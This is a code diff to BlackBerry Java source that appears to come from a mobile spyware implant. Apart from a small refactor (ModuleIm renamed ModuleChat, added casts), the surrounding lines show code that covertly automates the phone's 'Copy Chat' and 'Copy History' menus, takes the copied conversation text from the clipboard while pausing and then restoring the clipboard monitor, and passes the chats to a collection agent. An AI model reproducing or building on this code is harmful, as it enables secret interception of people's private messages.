@@ -19,8 +19,8 @@ import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
+import blackberry.module.ModuleChat;
 import blackberry.module.ModuleClipboard;
-import blackberry.module.ModuleIm;
 import blackberry.utils.Check;
 
 public class ConversationScreen {
@@ -91,7 +91,7 @@ public class ConversationScreen {
                     String partecipants = (String) result.elementAt(0);
                     Vector lines = (Vector) result.elementAt(1);
 
-                    ModuleIm agent = ModuleIm.getInstance();
+                    ModuleChat agent = (ModuleChat) ModuleChat.getInstance();
                     agent.add(partecipants, lines);
 
                     //#ifdef DEMO
@@ -126,9 +126,9 @@ public class ConversationScreen {
         if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
                 screen, true)) {
 
-            ModuleClipboard.getInstance().suspendClip();
+            ((ModuleClipboard)ModuleClipboard.getInstance()).suspendClip();
             clip = (String) Clipboard.getClipboard().get();
-            ModuleClipboard.getInstance().setClip(clip);
+            ((ModuleClipboard)ModuleClipboard.getInstance()).setClip(clip);
             
             try {
                 //Clipboard.getClipboard().put(before);
